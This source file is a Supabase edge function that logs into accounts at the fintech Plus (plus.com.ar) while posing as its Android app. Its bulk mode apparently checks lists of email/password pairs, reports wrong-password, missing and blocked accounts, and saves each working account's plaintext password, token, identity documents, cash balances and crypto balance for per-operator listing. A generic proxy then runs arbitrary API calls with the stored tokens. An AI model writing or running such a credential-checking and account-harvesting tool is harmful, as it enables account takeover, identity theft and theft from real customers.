import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const PLUS_HEADERS = {
  "Accept-Encoding": "gzip",
  "Connection": "Keep-Alive",
  "Content-Type": "application/json",
  "User-Agent": "okhttp/4.12.0",
  "accept": "application/json",
  "mobile-app": "bGCI6D67bJ88",
  "mobile-app-version": "2.2.4",
  "x-channel": "9DF8CB31A4",
  "x-device-manufacturer": "samsung",
  "x-device-model": "SM-S9110",
  "x-device-name": "SM-S9110",
  "x-device-unique-id": "8937364d03a1f0a0",
  "x-os": "android",
};

const AUTH_URL = "https://ms.plus.com.ar/plus/auth/login";
const API_URL = "https://api.plus.com.ar";

async function fetchWithRetry(url: string, options: RequestInit, retries = 2): Promise<Response> {
  for (let i = 0; i <= retries; i++) {
    try {
      const res = await fetch(url, options);
      if (res.status >= 500 && i < retries) {
        await new Promise(r => setTimeout(r, 1000 * (i + 1)));
        continue;
      }
      return res;
    } catch (e) {
      if (i === retries) throw e;
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
  throw new Error("Max retries reached");
}

async function fetchAccountData(token: string) {
  const authHeader = { ...PLUS_HEADERS, Host: "api.plus.com.ar", authorization: `Bearer ${token}` };
  const body = JSON.stringify({ "front-web": true });

  const [profileRes, balancesRes, fintechRes, limitsRes, cryptoRes] = await Promise.all([
    fetchWithRetry(`${API_URL}/users/profile`, { method: "POST", headers: authHeader, body }),
    fetchWithRetry(`${API_URL}/inversions/balances`, { method: "POST", headers: authHeader, body }),
    fetchWithRetry(`${API_URL}/fintech/profile?front-web=true`, { method: "GET", headers: { ...authHeader, "content-type": "application/json" } }),
    fetchWithRetry(`${API_URL}/users/all-limits`, { method: "POST", headers: authHeader, body }),
    fetchWithRetry(`${API_URL}/crypto/balance`, { method: "POST", headers: authHeader, body }),
  ]);

  const [profile, balances, fintech, limits, crypto] = await Promise.all([
    profileRes.json().catch(() => null),
    balancesRes.json().catch(() => null),
    fintechRes.json().catch(() => null),
    limitsRes.json().catch(() => null),
    cryptoRes.json().catch(() => null),
  ]);

  return { profile, balances, fintech, limits, crypto };
}

const asObject = (value: any): Record<string, any> | null => (
  value && typeof value === "object" && !Array.isArray(value) ? value : null
);

const asNumber = (value: any): number | null => (
  typeof value === "number" && Number.isFinite(value) ? value : null
);

async function saveAccount(supabase: any, email: string, password: string, token: string, data: any, opCode: string) {
  const profile = asObject(data?.profile);
  const balances = asObject(data?.balances);
  const fintech = asObject(data?.fintech);
  const limits = asObject(data?.limits);
  const crypto = asObject(data?.crypto);

  const fullName = `${profile?.first_name || ""} ${profile?.last_name || ""}`.trim();

  const { data: existing } = await supabase
    .from("plus_accounts")
    .select("id, full_name, document, cuit, phone, city, province, profile_data, balance_ars, balance_usd, fintech_data, limits_data, crypto_data")
    .eq("email", email)
    .eq("operator_code", opCode)
    .maybeSingle();

  const existingARS = asObject(existing?.balance_ars);
  const existingUSD = asObject(existing?.balance_usd);

  const hasBalancePayload = balances && !balances.error;

  const balanceARS = hasBalancePayload
    ? {
        ars: asNumber(balances?.ars) ?? asNumber(existingARS?.ars) ?? 0,
        pendingARS: asNumber(balances?.pendingARS) ?? asNumber(existingARS?.pendingARS) ?? 0,
      }
    : (existing?.balance_ars ?? null);

  const balanceUSD = hasBalancePayload
    ? {
        usd: asNumber(balances?.usd) ?? asNumber(existingUSD?.usd) ?? 0,
        pendingUSD: asNumber(balances?.pendingUSD) ?? asNumber(existingUSD?.pendingUSD) ?? 0,
      }
    : (existing?.balance_usd ?? null);

  const accountData = {
    email,
    password,
    operator_code: opCode,
    access_token: token,
    full_name: fullName || existing?.full_name || null,
    document: profile?.document ?? existing?.document ?? null,
    cuit: profile?.cuit ?? existing?.cuit ?? null,
    phone: profile?.profile?.telephone ?? existing?.phone ?? null,
    city: profile?.profile?.city ?? existing?.city ?? null,
    province: profile?.profile?.province?.name ?? existing?.province ?? null,
    profile_data: profile && !profile.error ? profile : (existing?.profile_data ?? null),
    balance_ars: balanceARS,
    balance_usd: balanceUSD,
    fintech_data: fintech && !fintech.error ? fintech : (existing?.fintech_data ?? null),
    limits_data: limits && !limits.error ? limits : (existing?.limits_data ?? null),
    crypto_data: crypto && !crypto.error ? crypto : (existing?.crypto_data ?? null),
    last_login_at: new Date().toISOString(),
    last_data_sync_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  };

  const query = existing
    ? supabase.from("plus_accounts").update(accountData).eq("id", existing.id)
    : supabase.from("plus_accounts").insert(accountData);

  const { error } = await query;
  if (error) throw error;
}

function isDataComplete(data: any): boolean {
  return data.profile && 
    typeof data.profile === 'object' &&
    !data.profile.error &&
    typeof data.profile !== 'string' &&
    (data.profile.first_name || data.profile.last_name) &&
    data.balances && 
    typeof data.balances === 'object' &&
    !data.balances.error &&
    typeof data.balances.ars === 'number';
}

async function loginSingle(email: string, password: string) {
  try {
    const loginRes = await fetchWithRetry(AUTH_URL, {
      method: "POST",
      headers: { ...PLUS_HEADERS, Host: "ms.plus.com.ar" },
      body: JSON.stringify({ email, password }),
    });
    
    if (loginRes.status === 429) {
      return { success: false, email, error: "Rate limit - aguarde" };
    }
    if (loginRes.status >= 500) {
      return { success: false, email, error: `Servidor Plus erro ${loginRes.status}` };
    }
    
    let loginData;
    try {
      loginData = await loginRes.json();
    } catch {
      return { success: false, email, error: `Resposta inválida (HTTP ${loginRes.status})` };
    }
    
    if (!loginRes.ok || !loginData.accessToken) {
      const msg = loginData.message || loginData.error || "";
      if (loginRes.status === 401 || msg.toLowerCase().includes("invalid") || msg.toLowerCase().includes("incorrect") || msg.toLowerCase().includes("wrong")) {
        return { success: false, email, error: "Senha incorreta" };
      }
      if (msg.toLowerCase().includes("not found") || msg.toLowerCase().includes("no existe")) {
        return { success: false, email, error: "Conta não existe" };
      }
      if (msg.toLowerCase().includes("blocked") || msg.toLowerCase().includes("bloqueado")) {
        return { success: false, email, error: "Conta bloqueada" };
      }
      return { success: false, email, error: msg || `Login falhou (HTTP ${loginRes.status})` };
    }
    
    const token = loginData.accessToken;
    
    // Fetch data immediately after login to avoid token expiration
    const data = await fetchAccountData(token);
    
    const hasCompleteData = isDataComplete(data);
    
    return { success: true, email, accessToken: token, hasCompleteData, ...data };
  } catch (e: any) {
    return { success: false, email, error: `Erro de rede: ${e.message}` };
  }
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { action, email, password, accessToken, operatorCode, accounts } = await req.json();

    if (action === "login") {
      const result = await loginSingle(email, password);
      if (!result.success) {
        return new Response(JSON.stringify({ error: result.error }), {
          status: 401,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      if (result.hasCompleteData) {
        const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
        const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
        const supabase = createClient(supabaseUrl, supabaseKey);
        await saveAccount(supabase, email, password, result.accessToken!, result, operatorCode || "master");
      }

      return new Response(JSON.stringify({ success: true, saved: !!result.hasCompleteData, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "bulk") {
      if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
        return new Response(JSON.stringify({ error: "No accounts provided" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
      const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
      const supabase = createClient(supabaseUrl, supabaseKey);
      const opCode = operatorCode || "master";

      // Process accounts sequentially to avoid rate limits on Plus API
      const results: any[] = [];
      for (const acc of accounts) {
        try {
          const result = await loginSingle(acc.email, acc.password);
          if (result.success && result.hasCompleteData) {
            await saveAccount(supabase, acc.email, acc.password, result.accessToken!, result, opCode);
          }
          results.push({ ...result, saved: !!(result.success && result.hasCompleteData) });
        } catch (e: any) {
          results.push({ success: false, email: acc.email, error: e.message });
        }
        // Small delay between each account
        if (accounts.indexOf(acc) < accounts.length - 1) {
          await new Promise(r => setTimeout(r, 500));
        }
      }

      return new Response(JSON.stringify({ success: true, results }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "list") {
      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
      const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
      const supabase = createClient(supabaseUrl, supabaseKey);
      const opCode = operatorCode || "master";

      let query = supabase
        .from("plus_accounts")
        .select("*")
        .order("updated_at", { ascending: false });

      if (opCode !== "master") {
        query = query.eq("operator_code", opCode);
      }

      const { data: rows, error: dbError } = await query.limit(500);

      if (dbError) {
        return new Response(JSON.stringify({ error: dbError.message }), {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      return new Response(JSON.stringify({ success: true, accounts: rows || [] }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "refresh") {
      const data = await fetchAccountData(accessToken);
      return new Response(JSON.stringify({ success: true, ...data }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "proxy") {
      // Generic proxy to Plus API
      const { endpoint, method, body, token } = await req.json().catch(() => ({}));
      if (!endpoint) {
        return new Response(JSON.stringify({ error: "Missing endpoint" }), {
          status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const authHeader = { ...PLUS_HEADERS, Host: "api.plus.com.ar", authorization: `Bearer ${token || accessToken}` };
      const res = await fetchWithRetry(`${API_URL}${endpoint}`, {
        method: method || "POST",
        headers: authHeader,
        body: body ? JSON.stringify(body) : undefined,
      });
      const resData = await res.json().catch(() => ({ error: "Invalid response" }));
      return new Response(JSON.stringify(resData), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ error: "Invalid action" }), {
      status: 400,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Plus auth error:", error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
